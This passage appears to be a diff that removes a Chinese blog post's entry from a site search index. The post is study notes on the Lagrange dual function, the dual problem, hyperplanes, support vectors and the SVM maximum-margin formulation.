-<p>$$<br>\begin{aligned}<br>	\mathtt{g}(\mathrm{\lambda},\mathrm{\mu)}&amp;&#x3D;\mathop {\mathrm{inf}} \limits_{\mathtt{x}\in \mathrm{D}}\mathcal{L} (\mathtt{x},\mathrm{\lambda},\mathrm{\mu)}\<br>	&amp;&#x3D;\mathop {\mathrm{inf}} \limits_{\mathtt{x}\in \mathrm{D}}\bigl( \mathtt{f}(\mathtt{x})+\sum_{\mathtt{i}&#x3D;\mathtt{l}}^{\mathtt{k}}{\lambda <em>{\mathtt{i}}\mathrm{c}</em>{\mathtt{i}}(\mathtt{x})}+\sum_{\mathtt{j}&#x3D;\mathtt{l}}^{\mathtt{l}}{\mathrm{\mu}<em>{\mathtt{j}}\mathrm{h}</em>{\mathtt{j}}(\mathtt{x})} \bigr)\<br>	\lambda &amp;\geqslant 0\<br>\end{aligned}<br>$$</p>
-<p>​	可以证明这个函数一定是凹函数。</p>
-<p>我们总结得到：<strong>不管原函数 f 的凹凸性， 它的对偶函数 g 一定是凹函数</strong></p>
-<p>我们之所以需要这么一个对偶函数是因为<strong>只要 λ 不小于 0 ， g的值永远不会超过 $$p^*$$</strong>。证明略</p>
-<p>也就是说， $$p^*$$永远都不会小于 $$max~g(\lambda,\mu)$$</p>
-<h5 id="从原问题到拉格朗日对偶问题"><a href="#从原问题到拉格朗日对偶问题" class="headerlink" title="从原问题到拉格朗日对偶问题"></a>从原问题到拉格朗日对偶问题</h5><p>我们通过拉格朗日对偶函数给出了最优解 $$p^<em>$$的下界，也就是说我们通过求$$max~g(\lambda,\mu)$$来逼近$$p^</em>$$的值</p>
-<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage2@main/999097456ceba220cd75ceae4f92041c.png" alt="在这里插入图片描述" style="zoom: 50%;">
-
-<p>回顾原问题，我们现在给出对偶问题的形式<br>$$<br>\begin{aligned}<br>	\max_{\lambda ,\mu} \mathtt{g}(\lambda ,\mu )&amp;&#x3D;\max_{\lambda ,\mu} \mathop {\mathrm{inf}} \limits_{\mathtt{x}\in \mathrm{D}}\mathcal{L} (\mathtt{x},\lambda ,\mu )\<br>	\mathrm{s}.\mathrm{t}\quad \lambda _{\mathtt{i}}&amp;\geqslant \mathtt{0},\mathtt{i}&#x3D;\mathtt{1},\mathtt{2},…,\mathtt{k}\<br>\end{aligned}<br>$$<br>这是个凸优化问题，我们转而去求 d^* 了。</p>
-<h4 id="KKT条件"><a href="#KKT条件" class="headerlink" title="KKT条件"></a>KKT条件</h4><p>学习中……</p>
-<h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><h4 id="超平面"><a href="#超平面" class="headerlink" title="超平面"></a>超平面</h4><p>二维空间上，两类点被一条直线完全分开叫做线性可分</p>
-<p>拓展到n维空间上，将n维欧氏空间上的两个点集$$D_1$$ 和$$D_2$$完全正确地划分开的 $$wx + b &#x3D; 0$$就成了一个超平面。</p>
-<h4 id="支持向量"><a href="#支持向量" class="headerlink" title="支持向量"></a>支持向量</h4><p>样本中距离超平面最近的一些点叫做支持向量</p>
-<p><img src="https://picx.zhimg.com/v2-0f1ccaf844905148b7e75cab0d0ee2e3_1440w.jpg" alt="img"></p>
-<h3 id="SVM最优化问题"><a href="#SVM最优化问题" class="headerlink" title="SVM最优化问题"></a>SVM最优化问题</h3><p>SVM想要找到的就是 最大间隔超平面，即支持向量离超平面最远</p>
-<p>任意超平面可以用以下线性方程来描述：<br>$$<br>w^T x + b &#x3D; 0<br>$$<br>由点到直线的距离公式推导可得，n维向量到超平面的距离为：<br>$$<br>\frac{|w^T x + b &#x3D; 0|}{||w||}<br>$$<br>其中 $$||w||$$ &#x3D; $$\sqrt{w_1^2+…+w_n^2}$$</p>
-<p>我们假设支持向量到超平面的距离为 d，可知其他向量到超平面的距离 &gt; d，于是我们可以这样描述超平面两端的向量：<br>$$<br>\left{ \begin{aligned}<br>	\frac{\boldsymbol{w}^T\boldsymbol{x}+\boldsymbol{b}}{||\boldsymbol{w}||}&amp;\ge \boldsymbol{d}\quad \boldsymbol{y}&#x3D;\boldsymbol{1}\<br>	\frac{\boldsymbol{w}^T\boldsymbol{x}+\boldsymbol{b}}{||\boldsymbol{w}||}&amp;\le -\boldsymbol{d}\quad \boldsymbol{y}&#x3D;-\boldsymbol{1}\<br>\end{aligned} \right.<br>$$<br>由于 $$||w||d$$ 严格大于0，我们假设它为 1 </p>
-<h2 id="sklearn实现SVM"><a href="#sklearn实现SVM" class="headerlink" title="sklearn实现SVM"></a>sklearn实现SVM</h2>]]></content>
-      <categories>
-        <category>计算机</category>
-      </categories>
-      <tags>
-        <tag>机器学习</tag>
-      </tags>
   </entry>
 </search>
